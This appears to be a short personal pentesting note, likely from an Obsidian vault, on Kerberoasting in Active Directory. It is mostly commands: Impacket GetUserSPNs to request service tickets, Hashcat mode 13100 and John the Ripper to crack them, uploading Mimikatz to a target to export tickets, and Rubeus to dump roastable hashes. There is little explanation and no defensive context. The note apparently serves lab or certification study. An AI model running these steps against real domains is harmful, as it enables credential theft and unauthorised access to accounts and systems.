![[Pasted image 20230117193447.png]]

***Goal Of Kerberoasting : Get TGS & Decrypt Server's Account Hash***

![[Pasted image 20230117193749.png]]

## Method 1: Impacket
**Syntax :-**
```sh
impacket-GetUserSPNs [Domainname/username:passwd] -dc-ip [Domain_IP] -request
```

![[Pasted image 20230117204710.png]]

Then, Crack It With [[Hashcat]]
Hashcat: 13100

## Method 2: Active Directory Module for PowerShell
```powershell
# In target machine's powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "[SPN]"

# Get SPN from Bloodhound or .\Get-SPN.ps1
```
![[Pasted image 20240512224005.png]]

```cmd
# Install Mimikatz on the target machine
lput mimikatz.exe
lput mimilib.dll
lput mimidrv.sys

# Start mimikatz shell
kerberos::list /export
# Search for the name of your kerberos ticket file and copy to Kali Linux
```
![[Pasted image 20240512224857.png]]
```cmd
# Exit mimikatz
exit

lget [filename]     # For a shorter name of the file, use dir /X
```

Finally, use [[John The Ripper]] to crack the hash! #kerberosticketcrack 

## Method 3: Rubeus
```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap
```